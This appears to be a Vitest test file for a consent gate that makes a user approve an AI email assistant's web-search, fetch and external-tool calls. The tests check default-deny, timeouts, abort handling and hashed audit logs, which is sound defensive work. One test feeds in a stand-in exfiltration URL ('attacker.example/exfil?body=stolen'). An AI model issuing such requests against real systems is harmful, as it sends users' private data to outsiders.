/**
 * Tests for the §3.10 P2 internet-tool interceptor.
 *
 * Coverage matrix (kept tight to behaviour, not internals):
 *   - per-turn consent: approve and deny dominate subsequent calls
 *     without re-prompting the user.
 *   - default-deny when no broadcaster wired (legacy callers / tests)
 *     and on broadcaster throw.
 *   - 30s timeout auto-denies and promotes the per-turn flag so
 *     subsequent calls do not all wait the full 30s.
 *   - abort signal denies immediately + cleans up timer/listener.
 *   - audit log entry shape (PII-safe — hash, not raw).
 *   - telemetry tags: `was_consented_for_turn`, `outcome`, normalised
 *     `tool_name`.
 *   - resolveConsent returns false for unknown ids (stale clicks
 *     after timeout / ai:newSession).
 *   - resetTurnConsent rejects pending entries as denied.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'

// Mock recordEvent so we can assert telemetry without booting the metrics
// pipeline.
const recordEventMock = vi.hoisted(() => vi.fn())
vi.mock('../metrics', () => ({
  recordEvent: recordEventMock,
}))

// Mock appendAiActionLog from packages/db so tests do not need a real
// SQLite (and so we can capture the audit-row shape).
const appendAiActionLogMock = vi.hoisted(() => vi.fn())
vi.mock('../../packages/db', () => ({
  appendAiActionLog: appendAiActionLogMock,
}))

// createLogger is harmless but importing electron-log indirectly under
// vitest can be noisy; stub the logger module.
vi.mock('../logger', () => ({
  createLogger: () => ({
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  }),
}))

import {
  createInternetGate,
  registerGate,
  unregisterGate,
  resolveConsent,
  resetTurnConsent,
  interceptInternetTool,
  isInternetTool,
  setInternetToolPendingBroadcaster,
  deniedToolResult,
  __setConsentTimeoutMs,
  __resetConsentTimeoutMs,
  type InternetGate,
} from './aiInternetGate'

beforeEach(() => {
  recordEventMock.mockReset()
  appendAiActionLogMock.mockReset()
  setInternetToolPendingBroadcaster(null)
  __resetConsentTimeoutMs()
})

afterEach(() => {
  setInternetToolPendingBroadcaster(null)
  __resetConsentTimeoutMs()
})

function makeGate(): InternetGate {
  return createInternetGate({ requestId: `req-${Math.random()}`, provider: 'openai-api' })
}

describe('isInternetTool', () => {
  it('matches the catalogue (Claude prefixed + Vercel bare + built-ins)', () => {
    expect(isInternetTool('WebSearch')).toBe(true)
    expect(isInternetTool('WebFetch')).toBe(true)
    expect(isInternetTool('mcp__mailcopilot__list_external_tools')).toBe(true)
    expect(isInternetTool('mcp__mailcopilot__call_external_tool')).toBe(true)
    expect(isInternetTool('list_external_tools')).toBe(true)
    expect(isInternetTool('call_external_tool')).toBe(true)
  })

  it('does not match other tool names', () => {
    expect(isInternetTool('mcp__mailcopilot__get_email')).toBe(false)
    expect(isInternetTool('get_email')).toBe(false)
    expect(isInternetTool('apply_mail_action')).toBe(false)
    expect(isInternetTool('')).toBe(false)
  })
})

describe('interceptInternetTool — default-deny without broadcaster', () => {
  it('denies when no broadcaster wired (legacy / unit-test path)', async () => {
    const gate = makeGate()
    const decision = await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'foo' },
    })
    expect(decision).toBe('denied')
    expect(recordEventMock).toHaveBeenCalledWith('ai.egress.intercepted', expect.objectContaining({
      tool_name: 'WebSearch',
      outcome: 'denied',
      was_consented_for_turn: false,
    }))
  })

  it('denies when the broadcaster throws synchronously', async () => {
    const gate = makeGate()
    setInternetToolPendingBroadcaster(() => { throw new Error('boom') })
    const decision = await interceptInternetTool({
      gate,
      toolName: 'WebFetch',
      toolInput: { url: 'https://example.com' },
    })
    expect(decision).toBe('denied')
  })
})

describe('interceptInternetTool — per-turn consent', () => {
  it('first approve switches consent to approved and records was_consented_for_turn=false', async () => {
    const gate = makeGate()
    registerGate(gate)
    setInternetToolPendingBroadcaster((event) => {
      // Simulate the renderer responding with approve.
      setTimeout(() => resolveConsent(event.requestId, 'approved'), 0)
    })

    const decision = await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'cats' },
    })
    expect(decision).toBe('approved')
    expect(gate.consentForTurn).toBe('approved')
    expect(recordEventMock).toHaveBeenCalledWith('ai.egress.intercepted', expect.objectContaining({
      outcome: 'approved',
      was_consented_for_turn: false,
    }))

    unregisterGate(gate)
  })

  it('subsequent calls in same turn skip prompt (was_consented_for_turn=true)', async () => {
    const gate = makeGate()
    gate.consentForTurn = 'approved'

    const broadcasterMock = vi.fn()
    setInternetToolPendingBroadcaster(broadcasterMock)

    const decision = await interceptInternetTool({
      gate,
      toolName: 'WebFetch',
      toolInput: { url: 'https://example.com' },
    })
    expect(decision).toBe('approved')
    expect(broadcasterMock).not.toHaveBeenCalled()
    expect(recordEventMock).toHaveBeenCalledWith('ai.egress.intercepted', expect.objectContaining({
      outcome: 'approved',
      was_consented_for_turn: true,
    }))
  })

  it('after deny, the rest of the turn is auto-denied without re-prompt', async () => {
    const gate = makeGate()
    gate.consentForTurn = 'denied'

    const broadcasterMock = vi.fn()
    setInternetToolPendingBroadcaster(broadcasterMock)

    const decision = await interceptInternetTool({
      gate,
      toolName: 'mcp__mailcopilot__call_external_tool',
      toolInput: { serverId: 'x', toolName: 'foo' },
    })
    expect(decision).toBe('denied')
    expect(broadcasterMock).not.toHaveBeenCalled()
    expect(recordEventMock).toHaveBeenCalledWith('ai.egress.intercepted', expect.objectContaining({
      outcome: 'denied',
      was_consented_for_turn: true,
    }))
  })
})

describe('interceptInternetTool — timeout auto-deny', () => {
  it('auto-denies after the configured timeout and promotes consent to denied', async () => {
    __setConsentTimeoutMs(50)
    const gate = makeGate()
    registerGate(gate)
    // Broadcaster never gets a response — simulates the user ignoring the prompt.
    setInternetToolPendingBroadcaster(() => { /* no resolve */ })

    const start = Date.now()
    const decision = await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'q' },
    })
    const elapsed = Date.now() - start
    expect(decision).toBe('denied')
    // Allow loose timing since vitest under load may run slowly. Lower
    // bound only — we just want to confirm the timer actually fired.
    expect(elapsed).toBeGreaterThanOrEqual(40)
    expect(gate.consentForTurn).toBe('denied')

    unregisterGate(gate)
  })
})

describe('interceptInternetTool — abort signal', () => {
  it('denies immediately when the abort signal is already aborted', async () => {
    const gate = makeGate()
    registerGate(gate)
    setInternetToolPendingBroadcaster(() => { /* never resolves */ })

    const ctrl = new AbortController()
    ctrl.abort()
    const decision = await interceptInternetTool({
      gate,
      toolName: 'WebFetch',
      toolInput: { url: 'https://x' },
      abortSignal: ctrl.signal,
    })
    expect(decision).toBe('denied')

    unregisterGate(gate)
  })

  it('denies when the abort signal fires while waiting', async () => {
    __setConsentTimeoutMs(5_000) // long enough to ensure abort wins
    const gate = makeGate()
    registerGate(gate)
    setInternetToolPendingBroadcaster(() => { /* never resolves */ })

    const ctrl = new AbortController()
    setTimeout(() => ctrl.abort(), 30)
    const decision = await interceptInternetTool({
      gate,
      toolName: 'WebFetch',
      toolInput: { url: 'https://x' },
      abortSignal: ctrl.signal,
    })
    expect(decision).toBe('denied')

    unregisterGate(gate)
  })
})

describe('resolveConsent', () => {
  it('returns false for unknown pending ids (stale click after timeout / new session)', () => {
    const ok = resolveConsent('not-a-real-id', 'approved')
    expect(ok).toBe(false)
  })

  it('clears the resolver so subsequent resolve calls also return false', async () => {
    const gate = makeGate()
    registerGate(gate)

    let capturedRequestId = ''
    setInternetToolPendingBroadcaster((event) => {
      capturedRequestId = event.requestId
    })

    // Fire and forget — we will resolve manually below.
    const promise = interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'q' },
    })

    // Wait until the broadcaster has been called (event-loop tick).
    await new Promise((r) => setTimeout(r, 5))

    expect(capturedRequestId).not.toBe('')
    const first = resolveConsent(capturedRequestId, 'approved')
    expect(first).toBe(true)
    const second = resolveConsent(capturedRequestId, 'denied')
    expect(second).toBe(false)

    await expect(promise).resolves.toBe('approved')
    unregisterGate(gate)
  })
})

describe('resetTurnConsent', () => {
  it('rejects pending entries as denied and clears the consent flag', async () => {
    __setConsentTimeoutMs(5_000)
    const gate = makeGate()
    registerGate(gate)
    setInternetToolPendingBroadcaster(() => { /* never resolves */ })

    const pending = interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'q' },
    })
    await new Promise((r) => setTimeout(r, 5))
    expect(gate.pending.size).toBe(1)

    resetTurnConsent(gate)
    expect(gate.consentForTurn).toBe('unset')
    expect(gate.pending.size).toBe(0)
    await expect(pending).resolves.toBe('denied')
  })
})

describe('audit log shape', () => {
  it('persists hashed query / url and tagged goal — never raw', async () => {
    const gate = makeGate()
    gate.consentForTurn = 'approved' // skip prompt

    const sensitiveQuery = 'attacker-stole-my-emails-Q'
    await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: sensitiveQuery },
    })

    expect(appendAiActionLogMock).toHaveBeenCalledTimes(1)
    const row = appendAiActionLogMock.mock.calls[0][0]
    expect(row.toolName).toBe('WebSearch')
    expect(row.outcome).toBe('ok')
    expect(row.injectionBlocked).toBe(0) // approved
    // Goal carries decision + tag + 16-char hex hash. NEVER the raw query.
    expect(row.goal).toMatch(/^egress_intercept:approved:turn-consent:[0-9a-f]{16}$/)
    expect(JSON.stringify(row)).not.toContain(sensitiveQuery)
  })

  it('denied intercepts increment injectionBlocked counter', async () => {
    const gate = makeGate()
    gate.consentForTurn = 'denied'

    await interceptInternetTool({
      gate,
      toolName: 'WebFetch',
      toolInput: { url: 'https://attacker.example/exfil?body=stolen' },
    })

    const row = appendAiActionLogMock.mock.calls[0][0]
    expect(row.injectionBlocked).toBe(1)
    expect(JSON.stringify(row)).not.toContain('attacker.example')
    expect(JSON.stringify(row)).not.toContain('stolen')
  })

  it('uses the prompt tag when the user actually decided in this call', async () => {
    const gate = makeGate()
    registerGate(gate)
    setInternetToolPendingBroadcaster((event) => {
      setTimeout(() => resolveConsent(event.requestId, 'denied'), 0)
    })

    await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'X' },
    })

    const row = appendAiActionLogMock.mock.calls[0][0]
    expect(row.goal).toMatch(/^egress_intercept:denied:prompt:[0-9a-f]{16}$/)

    unregisterGate(gate)
  })
})

describe('deniedToolResult', () => {
  it('produces a structured payload mentioning the tool name', () => {
    const r = deniedToolResult('WebSearch')
    expect(r.blocked).toBe(true)
    expect(r.reason).toBe('internet_tool_denied')
    expect(r.message).toContain('WebSearch')
  })
})

describe('display field extraction', () => {
  it('passes query for WebSearch and url for WebFetch through the broadcaster payload', async () => {
    const gate = makeGate()
    registerGate(gate)

    const events: Array<{ query?: string; url?: string; toolName: string }> = []
    setInternetToolPendingBroadcaster((event) => {
      events.push({ query: event.query, url: event.url, toolName: event.toolName })
      // resolve immediately so the test does not hang
      setTimeout(() => resolveConsent(event.requestId, 'denied'), 0)
    })

    await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'cats' },
    })
    // Per-turn deny — second call short-circuits (no broadcaster invocation).
    await interceptInternetTool({
      gate,
      toolName: 'WebFetch',
      toolInput: { url: 'https://example.com/path?q=1' },
    })

    expect(events).toHaveLength(1)
    expect(events[0]).toEqual({ toolName: 'WebSearch', query: 'cats', url: undefined })

    unregisterGate(gate)
  })

  it('exposes the inner toolName as query for call_external_tool', async () => {
    const gate = makeGate()
    registerGate(gate)

    const events: Array<{ query?: string; url?: string; toolName: string }> = []
    setInternetToolPendingBroadcaster((event) => {
      events.push({ query: event.query, url: event.url, toolName: event.toolName })
      setTimeout(() => resolveConsent(event.requestId, 'denied'), 0)
    })

    await interceptInternetTool({
      gate,
      toolName: 'call_external_tool',
      toolInput: { serverId: 'my-server', toolName: 'my_remote_fn' },
    })

    expect(events).toHaveLength(1)
    expect(events[0].query).toBe('my_remote_fn')
    expect(events[0].url).toBeUndefined()

    unregisterGate(gate)
  })

  it('returns no display fields for unrecognised tool input shapes', async () => {
    const gate = makeGate()
    registerGate(gate)

    const events: Array<{ query?: string; url?: string }> = []
    setInternetToolPendingBroadcaster((event) => {
      events.push({ query: event.query, url: event.url })
      setTimeout(() => resolveConsent(event.requestId, 'denied'), 0)
    })

    await interceptInternetTool({
      gate,
      toolName: 'mcp__mailcopilot__list_external_tools',
      toolInput: { somethingUnexpected: 123 },
    })

    expect(events).toHaveLength(1)
    expect(events[0].query).toBeUndefined()
    expect(events[0].url).toBeUndefined()

    unregisterGate(gate)
  })
})

describe('normalised tool tag fallback', () => {
  it('maps an unknown tool name to "other" in telemetry', async () => {
    const gate = makeGate()
    gate.consentForTurn = 'approved'

    await interceptInternetTool({
      gate,
      toolName: 'completely_unknown_future_tool',
      toolInput: {},
    })

    expect(recordEventMock).toHaveBeenCalledWith('ai.egress.intercepted', expect.objectContaining({
      tool_name: 'other',
      outcome: 'approved',
    }))
  })
})

describe('hashQueryOrUrl edge cases (via audit log)', () => {
  it('stores empty string in goal when query is empty', async () => {
    const gate = makeGate()
    gate.consentForTurn = 'approved'

    await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: '' },
    })

    const row = appendAiActionLogMock.mock.calls[0][0] as { goal: string }
    // No trailing colon + hash segment when hash is empty.
    expect(row.goal).toBe('egress_intercept:approved:turn-consent')
  })

  it('stores empty string in goal when query is whitespace only', async () => {
    const gate = makeGate()
    gate.consentForTurn = 'approved'

    await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: '   ' },
    })

    const row = appendAiActionLogMock.mock.calls[0][0] as { goal: string }
    expect(row.goal).toBe('egress_intercept:approved:turn-consent')
  })

  it('stores a 16-char hex hash in goal when query is non-empty', async () => {
    const gate = makeGate()
    gate.consentForTurn = 'approved'

    await interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'hello world' },
    })

    const row = appendAiActionLogMock.mock.calls[0][0] as { goal: string }
    expect(row.goal).toMatch(/^egress_intercept:approved:turn-consent:[0-9a-f]{16}$/)
  })
})

describe('concurrent requests — multi-gate registry', () => {
  it('resolves each gate independently via its own pendingId', async () => {
    const gate1 = makeGate()
    const gate2 = makeGate()
    registerGate(gate1)
    registerGate(gate2)

    const capturedIds: string[] = []
    setInternetToolPendingBroadcaster((event) => {
      capturedIds.push(event.requestId)
    })

    // Start two concurrent intercepts; neither resolves yet.
    const p1 = interceptInternetTool({
      gate: gate1,
      toolName: 'WebSearch',
      toolInput: { query: 'q1' },
    })
    const p2 = interceptInternetTool({
      gate: gate2,
      toolName: 'WebFetch',
      toolInput: { url: 'https://q2.example' },
    })

    // Wait for both broadcasters to be called.
    await new Promise((r) => setTimeout(r, 5))
    expect(capturedIds).toHaveLength(2)

    // Resolve them in reverse order: deny gate2 first, approve gate1 second.
    resolveConsent(capturedIds[1], 'denied')
    resolveConsent(capturedIds[0], 'approved')

    await expect(p1).resolves.toBe('approved')
    await expect(p2).resolves.toBe('denied')

    unregisterGate(gate1)
    unregisterGate(gate2)
  })

  it('resolving one gate does not affect per-turn consent on the other', async () => {
    const gate1 = makeGate()
    const gate2 = makeGate()
    registerGate(gate1)
    registerGate(gate2)

    const capturedIds: string[] = []
    setInternetToolPendingBroadcaster((event) => {
      capturedIds.push(event.requestId)
    })

    const p1 = interceptInternetTool({
      gate: gate1,
      toolName: 'WebSearch',
      toolInput: { query: 'a' },
    })
    const p2 = interceptInternetTool({
      gate: gate2,
      toolName: 'WebSearch',
      toolInput: { query: 'b' },
    })

    await new Promise((r) => setTimeout(r, 5))
    resolveConsent(capturedIds[0], 'approved')
    resolveConsent(capturedIds[1], 'denied')

    await p1
    await p2

    expect(gate1.consentForTurn).toBe('approved')
    expect(gate2.consentForTurn).toBe('denied')

    unregisterGate(gate1)
    unregisterGate(gate2)
  })
})

describe('race: user click arrives at same tick as timeout fires', () => {
  it('only the first settlement wins — second resolveConsent returns false', async () => {
    __setConsentTimeoutMs(20)
    const gate = makeGate()
    registerGate(gate)

    let capturedId = ''
    setInternetToolPendingBroadcaster((event) => {
      capturedId = event.requestId
    })

    const promise = interceptInternetTool({
      gate,
      toolName: 'WebSearch',
      toolInput: { query: 'race' },
    })

    // Wait for broadcaster to be called, then race user click vs timer.
    await new Promise((r) => setTimeout(r, 5))
    expect(capturedId).not.toBe('')

    // Fire user click (may win or lose the race against the 20ms timer).
    const userClickResult = resolveConsent(capturedId, 'approved')

    const decision = await promise

    if (userClickResult) {
      // User click won the race — decision is approved.
      expect(decision).toBe('approved')
      // After the timer fires it finds nothing to resolve (already cleared).
      const lateClick = resolveConsent(capturedId, 'denied')
      expect(lateClick).toBe(false)
    } else {
      // Timeout won — decision is denied; user click came too late.
      expect(decision).toBe('denied')
    }

    unregisterGate(gate)
  })
})
